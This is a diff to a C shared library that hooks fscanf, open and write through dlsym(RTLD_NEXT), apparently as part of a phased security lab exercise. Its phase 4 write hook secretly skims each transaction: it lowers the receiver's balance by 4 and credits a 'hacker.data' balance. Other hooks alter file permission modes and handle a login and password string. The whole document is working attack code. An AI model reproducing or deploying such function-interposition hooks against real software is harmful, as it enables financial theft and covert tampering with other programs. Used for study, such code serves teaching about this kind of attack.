@@ -47,12 +47,14 @@ char* phaseNum;
 
 
 
-/* PHASE 1 */
+
 int fscanf(FILE *stream, const char *format, ...) {
 	int rc;
 	va_list ap;
 	va_start(ap, format);
 	if (strcmp(format, "%ms") == 0) {
+		/* PHASE 1 */
+		phaseNum = "1";
 		char *turtleString = "turtle";
 		char *username = getlogin();
 		char *password = (char*)malloc(12);
@@ -72,27 +74,24 @@ int fscanf(FILE *stream, const char *format, ...) {
 
 
 int open(const char *pathname, int flags, ...) {
-	// // Store the phase number
 
 	static int (*origopen)(const char *pathname, int flags,...) = NULL;
 	origopen = (int (*)(const char*, int, ...))dlsym(RTLD_NEXT, "open");
 
-	mode_t openMode;
-
+	// Store the phase number
 	if (isdigit(*pathname)) {
 		phaseNum = pathname;
 	}
 
+	// To fix unable to open file error
+	mode_t openMode;
 	if (strcmp(phaseNum, "0")==0)  {
 		openMode = 0600;
 		return origopen(pathname, flags, openMode);
-
 	}
-
 	if (strcmp(phaseNum, "1")==0)  {
 		openMode = 00;
 		return origopen(pathname, flags, openMode);
-
 	}
 
 	return origopen(pathname, flags);
@@ -110,7 +109,7 @@ int open(const char *pathname, int flags, ...) {
 int phase4_skim = 0;
 int phase4_hacker_bal;
 int phase4_start = 1;
-ssize_t write(int fd, const void *buf, size_t count){
+ssize_t write(int fd, const void *buf, size_t count) {
 	static ssize_t (*origwrite)(int fd, const void *buf, size_t count) = NULL;
 	origwrite = (ssize_t (*)(int, const void*, size_t))dlsym(RTLD_NEXT, "write");
 
@@ -133,60 +132,51 @@ ssize_t write(int fd, const void *buf, size_t count){
 		}
 	}
 
+	/* PHASE 4 */
 	if (strcmp(phaseNum, "4")==0)  {
 		if (phase4_start) {
 			int hackerFd = open("hacker.data", 2, 0600);
-			char* hackerBuffer1 = malloc(5);
-			read(hackerFd, &hackerBuffer1, 5);
-			phase4_hacker_bal = atoi(hackerBuffer1);
-			phase4_start = 0; // need to reset to 1 when done w phase4
+			char* hackerBuffer = malloc(5);
+			read(hackerFd, &hackerBuffer, 5);
+			phase4_hacker_bal = atoi(hackerBuffer);
+			free(hackerBuffer);
+			phase4_start = 0;
 		}
 		if(phase4_skim){
-
 			/* skim off transaction */
 
 			// decrement balance of receiver by one
-			int currBal = atoi((char*)buf);
-			currBal = currBal - 2;
+			int currBal;
+			sscanf(buf, "%d", &currBal);
+			currBal = currBal - 4;
 
 			// convert back to void *
-			char *temp_buffer = malloc(5);
-			snprintf(temp_buffer, 5, "%d", currBal);
-			buf = (const void*)temp_buffer;
+			int acctBalStringLength = snprintf( NULL, 0, "%d", currBal );
+			char *temp_buffer = malloc(acctBalStringLength+1);
+			snprintf(temp_buffer, acctBalStringLength+1, "%d", currBal);
+			buf = memcpy(buf, temp_buffer, acctBalStringLength+1);
+			free(temp_buffer);
 
-			/* allocate to hacker */
-
-			// get file descriptor
-			//int hackerFd = open("hacker.data", 2, 0600);
-			//fprintf(stderr,"FILE DESCRIPTOR: %d\n",hackerFd);
-
-			// read balance from hacker file
-/* 			char hackerBuffer1[5];
-			FILE *fp = fopen("hacker.data","r");
-			int i = 0;
-			while(feof(fp)){
-				hackerBuffer1[i++] = fgetc(fp);
-			}
-			hackerBuffer1[i] = '\0'; */
-
-			// char* hackerBuffer1 = malloc(5);
-			// read(hackerFd, &hackerBuffer1, 5);
-
-			// increment hacker balance by one
-			//int hackerBal = atoi(hackerBuffer1);
-			phase4_hacker_bal = phase4_hacker_bal + 2;
-			fprintf(stderr,"hackerbalance: %d\n",phase4_hacker_bal);
+			// increment hacker balance by 4
+			phase4_hacker_bal = phase4_hacker_bal + 4;
 
 			// convert back to void *
 			int hackerBalStringLength = snprintf( NULL, 0, "%d", phase4_hacker_bal );
-			char *hackerBuffer2 = malloc(hackerBalStringLength+1);
-			snprintf(hackerBuffer2, hackerBalStringLength+1, "%d", phase4_hacker_bal);
-			const void * hackerWriteBuff = (const void*)hackerBuffer2;
-			origwrite(6, hackerWriteBuff, hackerBalStringLength+1);
+			char *hackerBuffer = malloc(hackerBalStringLength+1);
+			snprintf(hackerBuffer, hackerBalStringLength+1, "%d", phase4_hacker_bal);
+
+			FILE *hackerFilePointer = fopen("hacker.data", "w");
+			fprintf(hackerFilePointer, "%s", hackerBuffer);
+			free(hackerBuffer);
+			fclose(hackerFilePointer);
 		}
 		phase4_skim = !phase4_skim;
 	}
-
+	else {
+		//phaseNum = "-1";
+		phase4_skim = 0;
+		phase4_start = 1;
+	}
 
 	return origwrite(fd, buf, count);
 }
